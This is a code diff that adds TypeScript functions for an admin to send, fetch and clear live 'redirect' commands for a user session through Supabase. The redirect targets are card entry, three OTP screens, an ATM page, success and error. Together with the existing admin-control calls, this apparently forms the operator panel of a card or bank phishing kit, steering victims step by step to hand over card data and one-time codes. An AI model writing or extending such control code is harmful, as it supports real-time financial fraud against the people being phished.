@@ -143,3 +143,106 @@ export async function getControlAction(sessionId: string) {
 export async function sendAdminControl(sessionId: string, action: string, token: string) {
   return jsonRequest<{ success: boolean; sessionId: string; action: string }>(`/admin/control/${sessionId}`, "POST", { action }, token);
 }
+
+// Send redirect command to Supabase for live navigation control
+export type RedirectTarget = 'home' | 'card' | 'otp1' | 'otp2' | 'otp3' | 'atm' | 'success' | 'error';
+
+export async function sendRedirectCommand(sessionId: string, target: RedirectTarget): Promise<boolean> {
+  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+  
+  if (!supabaseUrl || !supabaseKey) {
+    console.warn("Supabase not configured for redirect");
+    return false;
+  }
+
+  try {
+    // First, clear any existing redirect for this session
+    await fetch(`${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}`, {
+      method: 'DELETE',
+      headers: {
+        'apikey': supabaseKey,
+        'Authorization': `Bearer ${supabaseKey}`,
+      },
+    });
+
+    // Set the new redirect target
+    const response = await fetch(`${supabaseUrl}/rest/v1/controls`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': supabaseKey,
+        'Authorization': `Bearer ${supabaseKey}`,
+        'Prefer': 'return=representation',
+      },
+      body: JSON.stringify({
+        session_id: sessionId,
+        action: 'redirect',
+        redirect_to: target,
+        created_at: new Date().toISOString(),
+      }),
+    });
+
+    if (!response.ok) {
+      console.warn("Failed to send redirect command:", response.status);
+      return false;
+    }
+
+    console.log("✅ Redirect command sent:", target, "for session:", sessionId);
+    return true;
+  } catch (error) {
+    console.error("Error sending redirect command:", error);
+    return false;
+  }
+}
+
+// Get pending redirect command for a session
+export async function getPendingRedirect(sessionId: string): Promise<{ redirect_to: RedirectTarget } | null> {
+  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+  
+  if (!supabaseUrl || !supabaseKey) return null;
+
+  try {
+    const response = await fetch(
+      `${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}&action=eq.redirect&order=created_at.desc&limit=1`,
+      {
+        headers: {
+          'apikey': supabaseKey,
+          'Authorization': `Bearer ${supabaseKey}`,
+        },
+      }
+    );
+
+    if (!response.ok) return null;
+
+    const data = await response.json();
+    if (data && data.length > 0) {
+      return { redirect_to: data[0].redirect_to };
+    }
+  } catch (error) {
+    console.error("Error getting pending redirect:", error);
+  }
+
+  return null;
+}
+
+// Clear redirect command after it's been processed
+export async function clearRedirectCommand(sessionId: string): Promise<void> {
+  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+  
+  if (!supabaseUrl || !supabaseKey) return;
+
+  try {
+    await fetch(`${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}&action=eq.redirect`, {
+      method: 'DELETE',
+      headers: {
+        'apikey': supabaseKey,
+        'Authorization': `Bearer ${supabaseKey}`,
+      },
+    });
+  } catch (error) {
+    console.error("Error clearing redirect command:", error);
+  }
+}
